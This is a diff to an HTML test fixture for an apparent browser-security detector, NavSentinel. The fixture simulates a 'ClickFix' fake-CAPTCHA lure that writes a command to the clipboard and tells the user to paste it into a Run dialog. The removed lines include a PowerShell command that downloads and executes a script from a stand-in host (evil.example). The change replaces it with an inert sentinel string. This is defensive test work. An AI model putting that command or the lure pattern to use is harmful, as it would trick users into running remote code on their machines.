@@ -89,8 +89,8 @@
 <body>
   <h1>ClickFix 01 - Basic Fake CAPTCHA</h1>
   <div class="description">
-    <strong>Attack scenario:</strong> A fake CAPTCHA overlay silently writes a malicious
-    command to the clipboard, then instructs the user to paste it into a Run dialog.
+    <strong>Attack scenario:</strong> A fake CAPTCHA overlay writes a visibly inert
+    synthetic sentinel to the clipboard, then instructs the user to paste it into a Run dialog.
     <br><br>
     <strong>Expected:</strong> NavSentinel detects the combination of clipboard write +
     overlay + instruction text and shows a warning.
@@ -125,20 +125,17 @@
   </div>
 
   <script>
-    // This simulates a ClickFix attack.
-    // In a real attack, clipboard.writeText() is called silently on click.
-    // Here we use a button to trigger it so the gym fixture is safe to interact with.
+    // This models the browser-visible part of ClickFix with an inert value only.
+    // The programme oracle stops at the local clipboard receipt. Nothing is executable.
     const verifyBtn = document.getElementById("verify-btn");
     const checkboxIcon = document.getElementById("checkbox-icon");
     const stepsSection = document.getElementById("steps-section");
     const statusEl = document.getElementById("status");
 
     verifyBtn.addEventListener("click", function() {
-      // Simulate the malicious clipboard write
-      // In a real attack this would be: powershell -e <base64_payload>
-      const fakeCommand = "powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://evil.example/payload.ps1')\"";
+      const syntheticClipboardValue = "NAVSENTINEL_SENTINEL_DO_NOT_RUN";
 
-      navigator.clipboard.writeText(fakeCommand).then(function() {
+      navigator.clipboard.writeText(syntheticClipboardValue).then(function() {
         // Show the "verification steps" (paste instructions)
         checkboxIcon.style.background = "#4285f4";
         checkboxIcon.innerHTML = "&#10003;";
